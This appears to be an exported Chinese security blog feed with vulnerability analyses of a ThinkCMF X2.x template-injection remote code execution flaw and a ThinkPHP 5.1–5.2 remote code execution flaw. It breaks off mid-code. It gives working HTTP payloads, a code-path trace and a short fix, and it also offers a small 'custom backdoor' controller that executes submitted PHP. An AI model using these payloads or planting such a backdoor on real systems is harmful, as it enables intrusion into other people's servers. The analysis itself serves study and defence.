    <content><![CDATA[<h3 id="ThinkCMF简介"><a href="#ThinkCMF简介" class="headerlink" title="ThinkCMF简介"></a>ThinkCMF简介</h3><p>ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。<br>ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>ThinkCMF X1.6.0</p>
<p>ThinkCMF X2.1.0</p>
<p>ThinkCMF X2.2.0</p>
<p>ThinkCMF X2.2.1</p>
<p>ThinkCMF X2.2.2</p>
<p>ThinkCMF X2.2.3</p>
<p>本次漏洞分析所用的ThinkCMF版本为ThinkCMF X2.2.2</p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><h4 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=display&amp;templateFile=README.md</span><br></pre></td></tr></table></figure>

<p>或者直接用display执行自定义Payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;display&amp;templateFile&#x3D;README.md&amp;content&#x3D;&lt;?php phpinfo();die();</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/26/K0wlZT.png" alt="K0wlZT.png"></p>
<h4 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2"></a>Payload2</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=fetch&amp;content=<span class="meta">&lt;?php</span> phpinfo();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/26/K0w6Wd.png" alt="K0w6Wd.png"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="Payload1分析"><a href="#Payload1分析" class="headerlink" title="Payload1分析"></a>Payload1分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=display&amp;templateFile=README.md</span><br></pre></td></tr></table></figure>

<p>首先了解一下ThinkPHP的框架规则，通过g\m\a参数指定分组\模块\方法，比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HomebaseController</span> </span>&#123;</span><br><span class="line"><span class="comment">//首页 小夏是老猫除外最帅的男人了</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;display(<span class="string">":index"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($what)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $what;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://s2.ax1x.com/2019/10/26/K0fNNR.png" alt="K0fNNR.png"></p>
<p>Index控制器</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">HomebaseController</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line"><span class="comment">//首页 小夏是老猫除外最帅的男人了</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;display(<span class="string">":index"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首页用的是Index控制器，我们可以通过a方法调用父类中属性为public的函数，一共有三个满足这样条件的函数.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> display()&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> fetch()&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> parseTemplaye()&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要能利用的是display方法和fetch方法。</p>
<p><strong>跟进父类HomebaseController中的display方法</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile = <span class="string">''</span>, $charset = <span class="string">''</span>, $contentType = <span class="string">''</span>, $content = <span class="string">''</span>, $prefix = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">parent</span>::display(<span class="keyword">$this</span>-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时$templateFile为readme.md</p>
<p><strong>跟进parseTemplate</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseTemplate</span><span class="params">($template=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(is_file($template)) &#123;   </span><br><span class="line"><span class="keyword">return</span> $template;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过parseTemplate最终返回readme.md</p>
<p>跟进Controller.class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile=<span class="string">''</span>,$charset=<span class="string">''</span>,$contentType=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view-&gt;display($templateFile,$charset,$contentType,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进Think\View-&gt;display</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($templateFile=<span class="string">''</span>,$charset=<span class="string">''</span>,$contentType=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    G(<span class="string">'viewStartTime'</span>);</span><br><span class="line">    <span class="comment">// 视图开始标签</span></span><br><span class="line">    Hook::listen(<span class="string">'view_begin'</span>,$templateFile);</span><br><span class="line">    <span class="comment">// 解析并获取模板内容</span></span><br><span class="line">    $content = <span class="keyword">$this</span>-&gt;fetch($templateFile,$content,$prefix);</span><br><span class="line">    <span class="comment">// 输出模板内容</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;render($content,$charset,$contentType);</span><br><span class="line">    <span class="comment">// 视图结束标签</span></span><br><span class="line">    Hook::listen(<span class="string">'view_end'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过fetch拿到$content内容，最终render渲染输出。</p>
<h4 id="Payload2分析"><a href="#Payload2分析" class="headerlink" title="Payload2分析"></a>Payload2分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=fetch&amp;content=<span class="meta">&lt;?php</span> phpinfo();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p>这个漏洞的主要问题就是在于fetch这个点，display函数在后来调用的也是fetch</p>
<p>这个payload分析的具体了一些，也算是补足display的在fetch中的详细内容吧，看网上的分析基本比较粗略吧，自己试着深入的分析了一下。最开始被缓存坑了…运行过一遍…第二次直接定位到缓存那去了…</p>
<h5 id="第一次运行的分析"><a href="#第一次运行的分析" class="headerlink" title="第一次运行的分析"></a>第一次运行的分析</h5><p><a href="https://www.anquanke.com/post/id/189712" target="_blank" rel="noopener">https://www.anquanke.com/post/id/189712</a></p>
<p>第一次是没有缓存文件的，其实和我第二次分析的也差不多，只不过因为我是第二次所以进入的是if,没有进入else中的fetch函数。</p>
<h5 id="第二次运行的分析"><a href="#第二次运行的分析" class="headerlink" title="第二次运行的分析"></a>第二次运行的分析</h5><p><strong>HomebaseController.class.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span></span>&#123;</span><br><span class="line">    $templateFile = <span class="keyword">empty</span>($content)?<span class="keyword">$this</span>-&gt;parseTemplate($templateFile):<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::fetch($templateFile,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进Controller.class.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;view-&gt;fetch($templateFile,$content,$prefix);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进View.class.php中fetch方法中listen</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'php'</span> == strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>))) &#123; <span class="comment">// 使用PHP原生模板</span></span><br><span class="line">        $_content   =   $content;</span><br><span class="line">        <span class="comment">// 模板阵列变量分解成为独立变量</span></span><br><span class="line">        extract(<span class="keyword">$this</span>-&gt;tVar, EXTR_OVERWRITE);</span><br><span class="line">        <span class="comment">// 直接载入PHP模板</span></span><br><span class="line">        <span class="keyword">empty</span>($_content)?<span class="keyword">include</span> $templateFile:<span class="keyword">eval</span>(<span class="string">'?&gt;'</span>.$_content);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 视图解析标签</span></span><br><span class="line">        $params = <span class="keyword">array</span>(<span class="string">'var'</span>=&gt;<span class="keyword">$this</span>-&gt;tVar,<span class="string">'file'</span>=&gt;$templateFile,<span class="string">'content'</span>=&gt;$content,<span class="string">'prefix'</span>=&gt;$prefix);</span><br><span class="line">        Hook::listen(<span class="string">'view_parse'</span>,$params);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取并清空缓存</span></span><br><span class="line">    $content = ob_get_clean();</span><br><span class="line">    <span class="comment">// 内容过滤标签</span></span><br><span class="line">    Hook::listen(<span class="string">'view_filter'</span>,$content);</span><br><span class="line">    <span class="comment">// 输出模板文件</span></span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进Hook.class.php中exec</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listen</span><span class="params">($tag, &amp;$params=NULL)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">self</span>::$tags[$tag])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(APP_DEBUG) &#123;</span><br><span class="line">            G($tag.<span class="string">'Start'</span>);</span><br><span class="line">            trace(<span class="string">'[ '</span>.$tag.<span class="string">' ] --START--'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">self</span>::$tags[$tag] <span class="keyword">as</span> $name) &#123;</span><br><span class="line">            APP_DEBUG &amp;&amp; G($name.<span class="string">'_start'</span>);</span><br><span class="line">            $result =   <span class="keyword">self</span>::exec($name, $tag,$params);</span><br><span class="line">            <span class="keyword">if</span>(APP_DEBUG)&#123;</span><br><span class="line">                G($name.<span class="string">'_end'</span>);</span><br><span class="line">                trace(<span class="string">'Run '</span>.$name.<span class="string">' [ RunTime:'</span>.G($name.<span class="string">'_start'</span>,$name.<span class="string">'_end'</span>,<span class="number">6</span>).<span class="string">'s ]'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">....</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Exec如下</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">($name, $tag,&amp;$params=NULL)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'Behavior'</span> == substr($name,<span class="number">-8</span>) )&#123;</span><br><span class="line">        <span class="comment">// 行为扩展必须用run入口方法</span></span><br><span class="line">        $class = $name;</span><br><span class="line">        $tag    =   <span class="string">'run'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $class   =  <span class="string">"plugins\\&#123;$name&#125;\\&#123;$name&#125;Plugin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(class_exists($class))&#123; <span class="comment">//ThinkCMF NOTE 插件或者行为存在时才执行</span></span><br><span class="line">        $addon   = <span class="keyword">new</span> $class();</span><br><span class="line">        <span class="keyword">return</span> $addon-&gt;$tag($params);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进run方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">(&amp;$_data)</span></span>&#123;</span><br><span class="line">    $engine             =   strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>));</span><br><span class="line">    $_content           =   <span class="keyword">empty</span>($_data[<span class="string">'content'</span>])?$_data[<span class="string">'file'</span>]:$_data[<span class="string">'content'</span>];</span><br><span class="line">    $_data[<span class="string">'prefix'</span>]    =   !<span class="keyword">empty</span>($_data[<span class="string">'prefix'</span>])?$_data[<span class="string">'prefix'</span>]:C(<span class="string">'TMPL_CACHE_PREFIX'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'think'</span>==$engine)&#123; <span class="comment">// 采用Think模板引擎</span></span><br><span class="line">        <span class="keyword">if</span>((!<span class="keyword">empty</span>($_data[<span class="string">'content'</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;checkContentCache($_data[<span class="string">'content'</span>],$_data[<span class="string">'prefix'</span>])) </span><br><span class="line">            ||  <span class="keyword">$this</span>-&gt;checkCache($_data[<span class="string">'file'</span>],$_data[<span class="string">'prefix'</span>])) &#123; <span class="comment">// 缓存有效</span></span><br><span class="line">            <span class="comment">//载入模版缓存文件</span></span><br><span class="line">            Storage::load(C(<span class="string">'CACHE_PATH'</span>).$_data[<span class="string">'prefix'</span>].md5($_content).C(<span class="string">'TMPL_CACHFILE_SUFFIX'</span>),$_data[<span class="string">'var'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $tpl = Think::instance(<span class="string">'Think\\Template'</span>);</span><br><span class="line">            <span class="comment">// 编译并加载模板文件</span></span><br><span class="line">            $tpl-&gt;fetch($_content,$_data[<span class="string">'var'</span>],$_data[<span class="string">'prefix'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在载入模板缓存文件，并进行inlcude文件包含，执行我们的php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Storage::load(C(<span class="string">'CACHE_PATH'</span>).$_data[<span class="string">'prefix'</span>].md5($_content).C(<span class="string">'TMPL_CACHFILE_SUFFIX'</span>),$_data[<span class="string">'var'</span>]);</span><br></pre></td></tr></table></figure>

<p>load函数如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">($_filename,$vars=null)</span></span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(!is_null($vars))&#123;</span><br><span class="line">extract($vars, EXTR_OVERWRITE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $_filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="自定义后门"><a href="#自定义后门" class="headerlink" title="自定义后门"></a>自定义后门</h3><p>这样的自定义后门比较方便的，而且这个直接去拿的是Think\Controller，并没有去HomebaseController.class.php拿display，如果直接去HomebaseController类去拿display会并且不加任何处理直接传入content内容是会由于主题不存在而直接报错的，不过我们给templateFile赋个值就好了，比如Readme.md或者index.php之类的，我上面也有写。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Portal</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoorController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">parent</span>::display(<span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>,$content, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/KsW66x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/27/KsW66x.md.png" alt="KsW66x.md.png"></a></p>
<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>将HomebaseController中fetch和display两个函数属性设置为protected，使其不可随意通过a参数调用。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/6626" target="_blank" rel="noopener">https://xz.aliyun.com/t/6626</a></p>
<p><a href="https://www.anquanke.com/post/id/189712" target="_blank" rel="noopener">https://www.anquanke.com/post/id/189712</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp 5.1-5.2 RCE分析</title>
    <url>/2019/10/08/Thinkphp-5-1-5-2-RCE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://imgchr.com/i/edTNeP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/02/edTNeP.png" alt="edTNeP.png"></a></p>
<p>payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=exec&amp;f=calc.exe&amp;&amp;_method=filter</span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先需要在入口文件处关闭报错——<code>error_reporting(0)</code>，然后在入口处打一下断点跟进。问题出现在获取路由检测的地方</p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBVSjH.png" alt="eBVSjH.png"></p>
<p>在这个地方接着打断点，开始自闭式跟进…<strong>（因为我不太清楚怎么去记录整个跟进的流程栈，所以只能疯狂自闭点击了，最后发现问题所在）</strong></p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBVBUx.png" alt="eBVBUx.png"></p>
<p>跟进到了Domain类中的check方法，这里调用了request的类中的method方法，跟进去看一下，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span><span class="params">($method = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $method) &#123;</span><br><span class="line">        <span class="comment">// 获取原始请求类型</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">$this</span>-&gt;method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_SERVER[<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题就出现在这个<code>var_method</code>是可控字段，由post来控制，绑定如下：</p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBKlVJ.png" alt="eBKlVJ.png"></p>
<p>也就是说我们可以通过post所传参的字段来控制<code>$this-&gt;method</code>的值，接下来跟着如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure>

<p>这样我们就可以调用任意方法了，在exp中给的是filter方法，跟进去看一下：</p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($filter = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以通过调用filter方法来对<code>Request</code>类中的filter变量在进行覆盖，覆盖后<code>$this-&gt;filter</code>的值就变成了我们传递的post数组了。</p>
<p>接下来执行代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$method = strtolower($request-&gt;method());</span><br><span class="line">$rules  = array_merge(<span class="keyword">$this</span>-&gt;rules[<span class="string">'*'</span>], <span class="keyword">$this</span>-&gt;rules[$method]);</span><br></pre></td></tr></table></figure>

<p>不过这里的$method方法是我们通过method方法覆盖过的，所以此时的$method的值其实是filter，但是我们也可以从上面图片中看到rules数组中是没有filter字段的，所以如果直接去执行exp的回显是如下情况的：</p>
<p><img src="https://s2.ax1x.com/2019/08/02/eBQMN9.png" alt="eBQMN9.png"></p>
<p>则会直接报错，所以我们在前面是需要关闭报错的，这样exp才能正常的执行。</p>
<p>当报错关闭后，这个调用method方法后产生的结果就会成功的出来了，也就是在request类中成功产生的赋值，效果如下：</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBReK0.png" alt="eBReK0.png"></p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBR3G9.png" alt="eBR3G9.png"></p>
<p>之前我们说到的是调用<code>routecheck</code>方法后会产生method方法的调用过程进而导致我们所传递的值都进行了赋予，那么我们回到app类，接着向下跟进</p>
<p><img src="https://s2.ax1x.com/2019/08/03/eBRNqK.png" alt="eBRNqK.png"></p>
<p>由图可见，在调用完<code>routecheck</code>方法后，判断是否有debug，然后进入if语句，这里我们的debug是开了的，所以可以进入下一处漏洞点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;request-&gt;param()</span><br></pre></td></tr></table></figure>

<p>跟进param方法，代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;param)) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为我们的$this-&gt;param并没有赋值，所以直接进入了method方法，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span><span class="params">($method = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $method) &#123;</span><br><span class="line">        <span class="comment">// 获取原始请求类型</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isCli() ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">$this</span>-&gt;method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[<span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'var_method'</span>)]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span 